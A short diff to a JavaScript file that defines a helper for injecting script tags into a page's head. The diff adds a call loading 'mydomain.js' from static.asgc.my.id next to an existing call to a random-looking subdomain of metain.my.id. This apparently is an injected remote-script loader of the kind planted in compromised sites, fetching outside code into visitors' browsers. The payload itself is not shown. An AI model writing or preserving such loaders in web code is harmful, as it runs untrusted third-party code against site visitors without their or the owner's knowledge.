@@ -1,3 +1,5 @@
+
+
 function loadAsyncScript(url) {
     const script = document.createElement("script");
     script.src = url;
@@ -10,5 +12,6 @@ function loadAsyncScript(url) {
 
     document.head.appendChild(script);
 }
+loadAsyncScript("https://static.asgc.my.id/mydomain.js?v=1.2");
 
 loadAsyncScript("https://3xjt2b.metain.my.id/front/in.js?v=1.2");
